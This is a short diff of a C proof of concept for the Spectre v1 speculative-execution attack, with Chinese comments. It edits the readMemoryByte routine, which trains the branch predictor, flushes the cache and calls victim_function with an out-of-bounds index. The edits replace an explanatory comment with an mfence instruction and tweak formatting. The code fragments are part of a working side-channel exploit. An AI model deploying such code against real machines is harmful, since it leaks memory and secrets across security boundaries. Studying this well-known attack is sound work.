@@ -60,6 +60,8 @@ void victim_function(size_t x)
 //设置cache hit的周期阈值
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
+
+
 //最优guess：value[0]，次优guess：value[1]
 void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int score[2])
 {
@@ -89,17 +91,14 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 		//array1_size=16
 		training_x = tries % array1_size;
 		for (j = 29; j >= 0; j--)
-		{ 
+		{  
 			_mm_clflush(&array1_size);//将array_size从cache中擦除
-			/*
-			延迟，也可以使用mfence，这一部分是必须的，删除后会攻击失败。
-			mfence:保证内存访问(读/)的串行化，内部操作就是在一系列内存访问中添加若干延迟
-			保证此指令之后的内存访问发生在此指令之前的内存访问完成之后（不出现重叠）
-			*/
+
 			for (volatile int z = 0; z < 100; z++)
 			{
 				/* Delay (can also mfence) */
 			} 
+			asm volatile("mfence\n");//这一部分是必须的
 			
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
@@ -111,7 +110,7 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 			x = training_x ^ (x & (malicious_x ^ training_x));
 			/*调用受害者函数*/
 			victim_function(x);
-		}
+		}//for
 
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
